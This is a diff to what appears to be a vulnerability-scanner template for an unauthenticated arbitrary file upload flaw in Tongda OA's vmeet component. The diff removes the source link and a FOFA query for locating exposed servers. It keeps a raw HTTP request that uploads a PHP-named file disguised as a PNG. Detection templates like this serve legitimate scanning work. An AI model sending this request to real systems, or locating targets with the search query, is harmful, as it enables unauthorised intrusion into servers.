@@ -3,12 +3,8 @@ info:
   name: 通达OA vmeet 前台任意文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/lhdt1kgpnkiqg7ad'
+  description: ''
   tags: file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: lhdt1kgpnkiqg7ad
-    fofa: title="office Anywhere" && icon_hash="-759108386" && "2011"
 http:
 - raw:
   - 'POST /general/vmeet/wbUpload.php?fileName=dudesuite.php+ HTTP/1.1
@@ -35,8 +31,6 @@ http:
     Upgrade-Insecure-Requests: 1
 
 
-
-
     -----------------------------307456622713326098592248556830
 
 
@@ -44,8 +38,6 @@ http:
 
 
     Content-Type: image/png
-
-
 
 
     dudesuite
